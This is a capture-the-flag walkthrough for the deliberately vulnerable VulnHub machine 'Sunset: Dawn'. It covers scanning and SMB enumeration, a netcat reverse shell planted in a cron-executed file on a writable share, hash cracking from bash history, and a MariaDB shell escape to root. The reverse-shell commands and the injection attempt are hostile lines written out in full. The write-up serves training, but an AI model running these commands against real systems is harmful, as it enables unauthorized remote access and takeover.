# Sunset: Dawn

https://www.vulnhub.com/entry/sunset-dawn,341/

1. Used netdiscover to find the machine - it was `PCS Systemtechnik GmbH` on the local network
2. Running a `nmap -T4 -A -v` against the machine resulted in:

```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 13
|   Capabilities flags: 63486
|   Some Capabilities: SupportsLoadDataLocal, Support41Auth, SupportsCompression, IgnoreSigpipes, Speaks41ProtocolNew, Speaks41ProtocolOld, ODBCClient, InteractiveClient, FoundRows, SupportsTransactions, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, ConnectWithDatabase, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: cAY~.f;3.*'%%*@G"p1A
|_  Auth Plugin Name: mysql_native_password
```

3. I ran dirb and nikto on the web site, but they found little:

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.165
+ Target Hostname:    192.168.1.165
+ Target Port:        80
+ Start Time:         2020-03-14 01:25:02 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                   
+ No CGI Directories found (use '-C all' to force check all possible dirs)                                                                                                                  
+ Server may leak inodes via ETags, header found with file /, inode: 317, size: 58f2eb81ffb49, mtime: gzip                                                                                  
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD                                                                                                                                            
+ OSVDB-3268: /logs/: Directory indexing found.                                                                                                                                             
+ OSVDB-3092: /logs/: This might be interesting...                                                                                                                                          
+ OSVDB-3233: /icons/README: Apache default file found.                                                                                                                                     
+ 7915 requests: 0 error(s) and 8 item(s) reported on remote host                                                                                                                           
+ End Time:           2020-03-14 01:27:23 (GMT-4) (141 seconds)                                                                                                                             
---------------------------------------------------------------------------                                                                                                                 
+ 1 host(s) tested
```

The log folder contained auth, daemon, error and management .log files. Only the management file could be read (the others returned a 403):

`Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...`

Dirb running with its default list found the logs folder. When run with the big.txt wordlist it found two more things, both throwing 403:

```
---- Scanning URL: http://192.168.1.165/ ----
==> DIRECTORY: http://192.168.1.165/cctv/                                                                                                                                                  
==> DIRECTORY: http://192.168.1.165/logs/                                                                                                                                                  
+ http://192.168.1.165/server-status (CODE:403|SIZE:301)                                                                                                                                   
                                                                                                                                                                                           
---- Entering directory: http://192.168.1.165/cctv/ ----
(!) WARNING: All responses for this directory seem to be CODE = 403.                                                                                                                       
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                           
---- Entering directory: http://192.168.1.165/logs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.           
```

## SMB

There are two smb shares visible via nmap. I ran `smbclient -L <ip address>` to see the following:
  
```
  Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)

```

The print share could not be accessed, the ITDEPT share was empty, and the IPC dir allowed access but no commands.

I tried creating a reverse shell via the `logon` command (`logon "/=``nc <kali ip> 4444 -e /bin/bash``"`) but it didn't work. Felt a bit stuck at this point.

## management.log and reverse shell

I wget/catted the management log file again, and found a mass of entries. Including this:

```
2020/03/14 22:41:01 CMD: UID=1000 PID=679    | /bin/sh -c /home/dawn/ITDEPT/product-control 
2020/03/14 22:41:01 CMD: UID=0    PID=676    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control 
```

So I put `nc 192.168.1.78 7777 -e /bin/sh` into a file called product control, then uploaded it to the smb drive. Half a minute later I had a reverse shell as dawn. I used `python -c "import pty;pty.spawn('/bin/bash');"` to get a better interface.

## mysql creds

`sudo -l` showed dawn had access to mysql, however sudo running this still gave access denied on the database with no password. I floated around and opened the bash history for dawn, finding lots of stuff including:

```
echo "$1$$bOKpT2ijO.XcGlpjgAup9/"
sudo -l 
su 
sudo -l 
sudo mysql -u root -p
```

Taking that hash to kali and cracking it with `sudo john --wordlist=/usr/share/wordlists/rockyou.txt mysqlpwd.txt` returned `onii-chan29`. 

## mariaDB privesc and win

The above password worked on mysql, which dropped me into the mariadb client. Poking around in the database didn't do too much for me, so I investigated running commands. `! bash` is the common syntax, but thats for the newer mysql client. For mariadb, the syntax is `\! bash;`, which dropped me to a root shell!

Catting the flag under /root returned:

```
Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!

flag{3a3e52f0a6af0d6e36d7c1ced3a9fd59}
```